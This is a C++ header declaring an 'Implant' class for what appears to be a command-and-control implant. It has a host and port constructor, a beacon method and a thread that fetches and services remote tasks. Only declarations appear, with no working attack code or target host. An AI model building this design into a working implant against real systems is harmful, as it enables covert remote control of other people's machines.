#pragma once

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid.hpp>
#include <boost/uuid/uuid_io.hpp>

#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include "api.hpp"
#include "task.hpp"

class Implant {
    public:
        // Our implant constructor
        Implant(std::string host, std::string port);
        // The thread for servicing tasks
        std::future<void> task_thread;
        // Our public functions that the implant exposes
        void beacon();
        void set_running(bool isRunning);
        void service_tasks();

    private:
	    std::unique_ptr<Api> api = nullptr;
        std::string id;
        bool is_running;

        std::vector<Task> parse_tasks_response(const std::string &response);
};
